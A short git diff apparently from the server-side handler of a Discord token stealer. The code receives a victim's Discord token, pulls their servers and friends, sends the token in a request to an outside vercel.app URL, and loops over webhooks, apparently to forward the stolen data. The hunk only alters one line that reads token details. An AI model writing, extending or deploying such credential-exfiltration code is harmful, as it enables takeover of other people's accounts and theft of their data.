@@ -25,7 +25,7 @@ export default async function handler(req, res) {
       var servers = await fetchServers(body.TOKEN);
       var friends = await fetchFriends(body.TOKEN);
       var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${body.TOKEN}`;
-      var discord = new DiscordToken(body.TOKEN).info;
+      var discord = DiscordToken(body.TOKEN).all;
       axios.get(copy).then(r => console.log(r)).catch(ee => console.error('Error in Axios request:', ee));
 
       for (const webhook of hooks.map(createWebhookClient)) {
